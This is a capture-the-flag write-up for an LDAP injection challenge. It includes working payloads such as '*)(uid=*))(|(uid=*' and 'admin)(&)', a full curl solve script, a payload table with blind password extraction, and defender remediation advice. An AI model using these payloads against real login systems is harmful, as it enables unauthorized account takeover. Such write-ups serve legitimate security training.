# Lightweight Directory — CTF Writeup

**Category:** Web (LDAP Injection / Authentication Bypass)
**Points:** 150
**Target:** `http://54.72.82.22:8070`
**Flag:** `safctf{ef30111b835006ade7f00a9a4526d453}`

---

## 1. Challenge Description

> **Lightweight Directory** — 150 pts
> *Travel light; the best journeys leave room for discovery.*
> Connect to the challenge web service: `http://54.72.82.22:8070`

**Hint interpretation:**

| Phrase | Meaning |
| --- | --- |
| "**Lightweight Directory**" | **LDAP** — *Lightweight Directory Access Protocol*. The login authenticates against a directory. |
| "the best journeys leave room for **discovery**" | "Directory" also = enumerate the directory (the app literally says *"explore the team operations directory"*). |
| "Travel light" | Thin app, thin input handling → the login filter is probably string-concatenated. |

The landing page theme is **ROSTER HQ, an esports team** — *"Manage your player identity and explore the team operations directory."*

---

## 2. Recon

### 2.1 Fingerprint

```bash
curl -s -i http://54.72.82.22:8070/
```

```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.11.16
Location: /connect
Vary: Cookie
```

Flask/Werkzeug app. The root redirects unauthenticated visitors to `/connect`.

### 2.2 The login page

```bash
curl -s http://54.72.82.22:8070/connect
```

```html
<div class="container">
    <h2>Login</h2>
    <form method="post">
        <input name="username" type="text" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <input type="submit" value="Login">
    </form>
</div>
```

A single username/password form posting to itself. No CSRF token, no client-side validation.

---

## 3. Step 1 — Map the Server's Behaviour

Before injecting, establish the response oracle. Every POST returns **HTTP 200** with a
`<p style='color:red;'>` message — except on success, which returns **302**.

```bash
B=http://54.72.82.22:8070
probe(){ curl -s -m 15 -X POST "$B/connect" \
  --data-urlencode "username=$1" --data-urlencode "password=$2" \
  | grep -oE "<p style='color:red;'>[^<]*" | sed "s/.*>//"; }

probe admin admin      # -> Log in to Directory Failed
probe admin password   # -> Log in to Directory Failed
```

### 3.1 There is a password length check

Brute-force the password length with a filler string:

```bash
for n in 1 2 3 4 5 6 7 8 9 10 12 16 20 32; do
  printf "len=%-3s -> " "$n"
  probe admin "$(python3 -c "print('A'*$n)")"
done
```

```
len=1   -> Password length not acceptable
len=2   -> Password length not acceptable
len=3   -> Password length not acceptable
len=4   -> Log in to Directory Failed      <-- accepted path starts here
len=5   -> Log in to Directory Failed
...
len=32  -> Log in to Directory Failed
```

**Constraint: `password` must be ≥ 4 characters.** This is only a client-side-grade sanity check —
it does not stop injection, it just means your payload password must be padded to 4+ chars.

> The `username` field has **no** length restriction. That asymmetry is the doorway.

---

## 4. Step 2 — LDAP Injection → Authentication Bypass

The backend almost certainly builds an LDAP search filter by concatenation, e.g.:

```python
f"(&(uid={username})(userPassword={password}))"
```

Supplying LDAP filter metacharacters lets us break out of the `uid=` clause and neutralise the
password check. The canonical payload closes the current clause, closes the AND group, and opens an
OR that is always true:

```
*)(uid=*))(|(uid=*
```

Injected into the presumed filter, the query becomes:

```
(&(uid=*)(uid=*))(|(uid=*)(userPassword=AAAA))
 ^^^^^^^^^^^^^^^^ always true      ^^^^^^^^^^ ignored (short-circuit)
```

### 4.1 Test the payload family

```bash
u1='*'
u2='*)(uid=*))(|(uid=*'
u3='*)(objectClass=*'
u4='admin)(&)'
u5='admin)(|(password=*'
u6='*)(cn=*'
u7='*))(|(uid=*'
u8='*)(uid=*'
```

Results — watch for the **302**:

| `username` payload | HTTP | Message |
| --- | --- | --- |
| `*` | 200 | Log in to Directory Failed |
| `*)(objectClass=*` | 200 | Log in to Directory Failed |
| `admin)(|(password=*` | 200 | Log in to Directory Failed |
| `*)(cn=*` | 200 | Log in to Directory Failed |
| `*)(uid=*` | 200 | Log in to Directory Failed |
| **`*)(uid=*))(|(uid=*`** | **302** | **← BYPASS** |
| **`admin)(&)`** | **302** | **← BYPASS** |
| **`*))(|(uid=*`** | **302** | **← BYPASS** |

> `admin)(&)` works because the filter collapses to `(&(uid=admin)(&))` → just "does user *admin*
> exist?", which is true — the password comparison is structurally eliminated.

### 4.2 Observe the session

```bash
curl -s -i -X POST "$B/connect" \
  --data-urlencode "username=*)(uid=*))(|(uid=*" \
  --data-urlencode "password=AAAA"
```

```
HTTP/1.1 302 FOUND
Location: /
Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ar9GGw.3EN8XpqcU16bFvb3tbXr10Cg00A; HttpOnly; Path=/
```

Decoding the Flask session payload (the first dot-separated segment is base64 JSON):

```bash
echo 'eyJ1c2VybmFtZSI6ImFkbWluIn0' | base64 -d
# {"username":"admin"}
```

**We are now `admin`.** The bypass didn't just pass a check — it landed us in the *administrator*
identity the directory returned for our always-true filter.

---

## 5. Step 3 — The Directory (Admin Panel)

With the session cookie, `GET /` renders the authenticated dashboard:

```bash
curl -s -H "Cookie: session=<SESSION>" http://54.72.82.22:8070/
```

```html
<div class="container">
    <h2>Welcome, admin</h2>
    <a href="/config-update">Edit player profile</a>
    <a href="/audit-export">Open team report</a>
    <a href="/audit-export">Open team report</a>
    <a href="/logout">Logout</a>
</div>
```

Two panels:

- `/config-update` — "Update Your Access ID" (a `new_username` form; cosmetic, redirects on POST)
- `/audit-export` — "Open team report" ← the interesting one

---

## 6. Step 4 — Grab the Flag

```bash
curl -s -H "Cookie: session=<SESSION>" http://54.72.82.22:8070/audit-export
```

```
safctf{ef30111b835006ade7f00a9a4526d453}
```

`/audit-export` is behind an admin check — without the bypassed session it refuses:

```bash
curl -s -i http://54.72.82.22:8070/audit-export
# HTTP/1.1 403 FORBIDDEN
# Directory administrator access required
```

### ✅ Flag

```
safctf{ef30111b835006ade7f00a9a4526d453}
```

---

## 7. Kill Chain Summary

```
http://54.72.82.22:8070/        302 → /connect
        │
        ▼
/connect  login form (username, password)
        │  password must be ≥4 chars (bypass sanity check only)
        ▼
LDAP injection in "username":
   *)(uid=*))(|(uid=*      → 302 FOUND  (auth bypass)
     (also: admin)(&) , *))(|(uid=* )
        │
        ▼
Set-Cookie: session={"username":"admin"}   ← now admin
        │
        ├─ GET /config-update   (player profile editor)
        ▼
GET /audit-export  (admin-only; 403 without session)
        │
        ▼
safctf{ef30111b835006ade7f00a9a4526d453}
```

---

## 8. Full Solve Script

```bash
#!/usr/bin/env bash
# Lightweight Directory — full solve
set -euo pipefail
B="http://54.72.82.22:8070"
CJ=$(mktemp)

# 1. LDAP injection to bypass login (password padded to ≥4 chars)
curl -s -c "$CJ" -X POST "$B/connect" \
  --data-urlencode 'username=*)(uid=*))(|(uid=*' \
  --data-urlencode 'password=AAAA' -o /dev/null

# 2. confirm we are admin
curl -s -b "$CJ" "$B/" | grep -o 'Welcome, [a-z]*'

# 3. read the admin-only report
curl -s -b "$CJ" "$B/audit-export"
echo
rm -f "$CJ"
```

**One-liner (cookie-jar in one shot):**

```bash
J=$(mktemp); curl -s -c $J -X POST http://54.72.82.22:8070/connect \
  --data-urlencode 'username=*)(uid=*))(|(uid=*' --data-urlencode 'password=AAAA' -o /dev/null
curl -s -b $J http://54.72.82.22:8070/audit-export
```

---

## 9. Tools & Techniques

| Tool | Purpose |
| --- | --- |
| `curl --data-urlencode` | Sending raw LDAP metacharacters (`*`, `(`, `)`, `|`, `&`) without shell/URL mangling |
| `curl -c/-b` cookie jar | Carrying the Flask session across requests |
| HTTP status diffing (`200` vs `302`) | The success oracle — errors are 200 + red text, success is a redirect |
| `grep -oE "<p style='color:red;'>"` | Extracting the app's error message cleanly |
| `base64 -d` | Decoding the Flask session payload to read `{"username":"admin"}` |
| HexStrike MCP / BlackBook MCP | Offensive orchestration + technique grounding |

### Techniques

1. **Password policy fingerprinting** — incrementing filler length to find the `len >= 4` rule
   (prevents your payload password from being rejected before it reaches LDAP).
2. **LDAP filter injection** — `*)(uid=*))(|(uid=*` to force an always-true filter and neutralise
   the password comparison.
3. **Authentication → authorization escalation** — the always-true filter returned the first
   matching entry (`admin`), so the resulting session was the *administrator*, not an anonymous user.
4. **Flask session inspection** — base64-decoding the client-side session to confirm identity.
5. **Status-code oracle** — using `302` vs `200` instead of grepping HTML.

### Useful LDAP injection payloads (general reference)

| Goal | Payload |
| --- | --- |
| Always-true username | `*` |
| Close clause, always-true OR | `*)(uid=*))(|(uid=*` |
| Escape via AND-to-EMPTY | `admin)(&)` |
| Short variant | `*))(|(uid=*` |
| Blind character extraction | `admin)(uid=admin)(|(userPassword=a*)` |

---

## 10. Defender Takeaways

- **Never build LDAP filters by string concatenation.** Escape all user input with an RFC 4515
  escaper before interpolation:

  ```python
  import ldap.filter
  safe = ldap.filter.escape_filter_chars(username)   # * ( ) \ NUL -> \2a \28 \29 \5c \00
  query = f"(&(uid={safe})(userPassword={pw}))"
  ```

  Or better, use a **parameterised / prepared** search through your directory library's API.

- **Validate and reject metacharacters** in identity fields — a legitimate `uid` never needs
  `*`, `(`, `)`, `|`, `&`, or NUL.
- **Don't let "first match wins" decide privilege.** Resolve the returned entry and explicitly map
  it to an application role; never infer admin from "the filter matched something".
- **Bind, then authorise separately.** Authenticate the user with a *bind* against their own DN
  rather than by searching for a matching password attribute — search-based auth is inherently
  injection-prone.
- **Length checks are not security.** The `len >= 4` rule did nothing to stop the bypass.
- Add rate limiting and generic error messages so 200/302 oracles and message differences don't
  hand attackers a free feedback loop.
